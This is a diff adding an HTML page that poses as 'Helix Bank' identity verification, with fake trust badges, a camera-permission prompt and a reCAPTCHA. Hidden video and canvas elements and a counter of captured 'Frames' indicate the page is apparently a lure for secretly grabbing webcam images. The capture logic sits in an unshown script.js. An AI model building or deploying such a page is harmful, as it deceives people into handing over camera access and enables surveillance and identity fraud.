@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Helix Bank — Verification</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+<script>
+  window.__recaptchaReady = false;
+  window.__cameraReady    = false;
+  window.onRecaptchaLoad = function () {
+    window.__recaptchaReady = true;
+    if (window.__tryRenderRecaptcha) window.__tryRenderRecaptcha();
+  };
+</script>
+<script src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaLoad&render=explicit" async defer></script>
+
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;}
+  :root{
+    --bg:#0a1628; --panel:#132947; --line:rgba(255,255,255,0.08);
+    --txt:#e8f0ff; --txt-dim:#8fa3c4; --txt-mute:#5a6b8a;
+    --lime:#c6f24e; --lime-glow:rgba(198,242,78,0.35); --white:#fff;
+  }
+  html,body{height:100%;}
+  body{
+    font-family:'Inter',sans-serif; background:var(--bg); color:var(--txt);
+    min-height:100vh; display:flex; flex-direction:column;
+    -webkit-font-smoothing:antialiased; letter-spacing:-0.01em;
+  }
+  .nav{
+    padding:18px 40px; display:flex; justify-content:space-between; align-items:center;
+    border-bottom:1px solid var(--line);
+  }
+  .logo{display:flex; align-items:center; gap:11px; font-weight:800; font-size:16px;}
+  .logo-mark{
+    width:28px; height:28px; border-radius:8px;
+    background:linear-gradient(135deg, var(--lime), #a8d63d);
+    display:flex; align-items:center; justify-content:center;
+    color:#0a1628; font-weight:900; font-size:13px;
+    box-shadow:0 4px 14px var(--lime-glow);
+  }
+  .nav-right{
+    font-family:'JetBrains Mono',monospace; font-size:11.5px;
+    color:var(--txt-mute); display:flex; gap:14px; align-items:center;
+  }
+  .nav-right .live{color:var(--lime);}
+  .stage{flex:1; display:flex; align-items:center; justify-content:center; padding:48px 22px;}
+  .panel{
+    width:100%; max-width:480px;
+    background:linear-gradient(180deg, var(--panel), #0f1f38);
+    border:1px solid var(--line); border-radius:16px; padding:32px;
+    box-shadow:0 40px 80px rgba(0,0,0,0.5);
+  }
+  .panel-head{padding-bottom:24px; border-bottom:1px solid var(--line); margin-bottom:24px;}
+  .panel-head .eyebrow{
+    font-family:'JetBrains Mono',monospace; font-size:10.5px;
+    color:var(--lime); letter-spacing:0.06em; margin-bottom:12px;
+  }
+  .panel-head h1{font-size:24px; font-weight:700; letter-spacing:-0.025em; color:var(--white); margin-bottom:8px;}
+  .panel-head p{font-size:14px; color:var(--txt-dim); line-height:1.55;}
+  .cam-row{
+    padding:18px; background:rgba(255,255,255,0.02);
+    border:1px solid var(--line); border-radius:12px; margin-bottom:16px;
+    display:flex; gap:14px; align-items:center; transition:all .35s;
+  }
+  .cam-row.active{
+    border-color:rgba(198,242,78,0.4); background:rgba(198,242,78,0.04);
+  }
+  .cam-row .icon{
+    width:42px; height:42px; border-radius:10px;
+    display:flex; align-items:center; justify-content:center;
+    font-size:19px; background:rgba(255,255,255,0.04); transition:all .3s;
+  }
+  .cam-row.active .icon{background:var(--lime); color:#0a1628;}
+  .cam-row .txt .t{font-size:14px; font-weight:600;}
+  .cam-row .txt .s{font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--txt-mute); margin-top:4px;}
+  .cam-row .status{
+    margin-left:auto; font-family:'JetBrains Mono',monospace;
+    font-size:10.5px; color:var(--txt-mute);
+  }
+  .cam-row.active .status{color:var(--lime);}
+  .stats{display:none; grid-template-columns:1fr 1fr 1fr; gap:10px; margin-bottom:16px;}
+  .stat{padding:12px 14px; background:rgba(255,255,255,0.02); border:1px solid var(--line); border-radius:10px;}
+  .stat .k{
+    font-family:'JetBrains Mono',monospace; font-size:9.5px;
+    color:var(--txt-mute); letter-spacing:0.05em; text-transform:uppercase; margin-bottom:6px;
+  }
+  .stat .v{font-size:20px; font-weight:800; color:var(--white);}
+  .stat .v.lime{color:var(--lime);}
+  .captcha-wrap{
+    padding:20px; background:rgba(255,255,255,0.02);
+    border:1px solid var(--line); border-radius:12px;
+    display:flex; justify-content:center; transition:all .3s;
+  }
+  .captcha-wrap.ready{border-color:rgba(198,242,78,0.3); background:rgba(198,242,78,0.02);}
+  #recaptchaWidget{display:inline-block;}
+  .dimmed{opacity:0.4; pointer-events:none; filter:grayscale(0.5);}
+  video,canvas{display:none;}
+  .footer{
+    padding:16px 40px; border-top:1px solid var(--line);
+    display:flex; justify-content:space-between;
+    font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--txt-mute);
+  }
+  #bottomRight{color:var(--lime);}
+</style>
+</head>
+<body>
+
+<nav class="nav">
+  <div class="logo"><div class="logo-mark">H</div>Helix Bank</div>
+  <div class="nav-right">
+    <span class="live">VERIFYING</span>
+  </div>
+</nav>
+
+<main class="stage">
+  <div class="panel">
+    <div class="panel-head">
+      <div class="eyebrow">// STEP 01 OF 01</div>
+      <h1>Identity verification</h1>
+      <p>Allow camera access and complete the human check below.</p>
+    </div>
+
+    <div class="cam-row" id="camCard">
+      <div class="icon">📷</div>
+      <div class="txt">
+        <div class="t" id="camTitle">Camera access</div>
+        <div class="s" id="camSub">AWAITING_PERMISSION</div>
+      </div>
+      <div class="status" id="camStatus">IDLE</div>
+    </div>
+
+    <div class="stats" id="stats">
+      <div class="stat"><div class="k">Frames</div><div class="v" id="cntCaptures">0</div></div>
+      <div class="stat"><div class="k">Latency</div><div class="v lime" id="latVal">—</div></div>
+      <div class="stat"><div class="k">Status</div><div class="v lime" id="delStatus">✓</div></div>
+    </div>
+
+    <div class="captcha-wrap dimmed" id="captchaWrap">
+      <div id="recaptchaWidget"></div>
+    </div>
+  </div>
+</main>
+
+<footer class="footer">
+  <span>HELIX BANK · MEMBER FDIC</span>
+  <span id="bottomRight">● SECURE</span>
+</footer>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script src="script.js"></script>
+</body>
+</html>
